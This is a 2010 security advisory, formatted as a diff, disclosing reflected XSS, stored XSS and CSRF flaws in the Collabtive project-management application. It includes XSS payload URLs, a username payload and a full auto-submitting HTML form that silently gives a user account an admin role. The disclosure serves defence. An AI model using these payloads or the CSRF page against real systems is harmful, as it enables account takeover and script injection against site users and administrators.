@@ -1,0 +1,100 @@
+ANATOLIA SECURITY ADVISORY
+------------------------------------
+
+### ADVISORY INFO ###
++ Title: Collabtive Multiple Vulnerabilities
++ Advisory URL: http://www.anatoliasecurity.com/adv/as-adv-2010-003.txt
++ Advisory ID:  2010-003
++ Version: 0.65
++ Date: 12/10/2010
++ Impact: Gaining Administrative Privileges - Execute Malicious
+Javascript Codes
++ CWE-ID: 352 (Cross-site Request Forgery) - 79 (Cross-site Scripting)
++ Credit: Anatolia Security
+
+
+
+### VULNERABLE PRODUCT ###
++ Description: "Collabtive provides a web based platform to bring the
+project
+management process and documentation online. Collabtive is an open
+source solution
+with features and functionality similar to proprietary software such as
+BaseCamp."
++ Homepage: http://www.collabtive.com
+
+
+
+### VULNERABILITY DETAILS ###
+
+I. Non-persistent Cross-site Scripting
+--------------------------------------
++ Description: Application insert HTTP "y" parameter in "manageajax.php"
+and HTTP "pic"
+parameter in "thumb.php" into html output and fails while sanitize user
+supplied these
+inputs. Attackers can execute malicious javascript codes or hijacking
+PHPSESSID for
+privilege escalation.
+
++ Exploit/POC:
+http://target/manageajax.php?action=newcal&y=<script>alert(/XSS/)</script>
+http://target/thumb.php?pic=<script>alert(/XSS/)</script>
+
+
+II. Cross-site Request Forgery
+------------------------------
++ Description: Collabtive affects from Cross-site Request Forgery.
+Technically, attacker
+can create a specially crafted page and force collabtive administrators
+to visit it and
+can gain administrative privilege. For prevention from CSRF
+vulnerabilities, application
+needs anti-csrf token, captcha and asking old password for critical actions.
+
++ Exploit/POC:
+http://www.anatoliasecurity.com/exploits/collabtive-csrf-xploit.txt
+
+<!--
+
+-*-*- ANATOLIA SECURITY (c) 2010 -*-*-
+
+$ Title: Proof of Concept Code for Collabtive
+$ ADV-ID: 2010-003
+$ ADV-URL: http://www.anatoliasecurity.com/adv/as-adv-2010-003.txt
+$ Technical Details: http://www.anatoliasecurity.com
+
+* PoC created by Eliteman 
+~ mail: eliteman [~AT~] anatoliasecurity [~DOT~] com
+~ web: elite.anatoliasecurity.com
+
+-->
+<html>
+<head>
+<title>Collabtive CSRF P0C</title>
+</head>
+<body>
+  <form method="post" action="http://collabtive/admin.php?action=edituser&id=2" enctype="multipart/form-data" name="csrfXploit">
+    <input type="hidden" value="hacker" name="name" />
+    <input type="hidden" value="hacker@hacker" name="email" />
+    <input type="hidden" value="m" name="gender" />
+    <input type="hidden" value="en" name="locale" />
+    <input type="hidden" value="" name="admin" />
+    <input type="hidden" value="1" name="role">
+  </form>
+  <script type="text/javascript">
+    document.csrfXploit.submit();
+  </script>
+</body>
+</html>
+
+
+III. Stored Cross-site Scripting
+--------------------------------
++ Description: Collabtive has Stored Cross-site Scripting vulnerability.
+Every user can
+change their usernames and application allows HTML codes and stores in
+database.
+
++ Exploit/POC: Change username to "user<script>alert(/AS/)</script>".
+
